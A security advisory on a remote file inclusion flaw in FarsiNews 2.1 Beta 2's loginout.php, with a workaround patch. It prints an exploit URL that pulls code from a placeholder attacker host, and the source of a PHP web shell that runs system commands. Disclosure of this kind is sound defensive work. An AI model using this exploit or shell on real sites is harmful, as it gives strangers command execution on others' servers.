Vulnerable Systems:
    FarsiNews 2.1 Beta 2 and below

Vulnerable Code: 
The following lines in loginout.php :
require_once($cutepath."/inc/functions.inc.php");
require_once($cutepath."/data/config.php");


Exploits:
If register_globals=ON  has been marked (check
PHP.INI) we can exploit  below URL to cause it to
include external file.

The following URL will cause the server to include
external files  ( phpshell.txt ):
http://[target]/loginout.php?cmd=dir&cutepath=http://[attacker]/phpshell.txt?

phpshell.txt
-------------------
<?
system ($_GET['cmd']);
die ("<h3>http://Hamid.ir >> Hamid Ebadi << (Hamid
Network Security Team)</h3> ");
?>
-----[EOF]--------

Workaround:
use FarsiNews 2.5 or for Unofficial Patch , simply add
the following line in  the second line of
loginout.php:

if (isset($_REQUEST["cutepath"])){ die("Patched by
Hamid Ebadi -->http://hamid.ir  ( Hamid Network
Security Team)  "); }
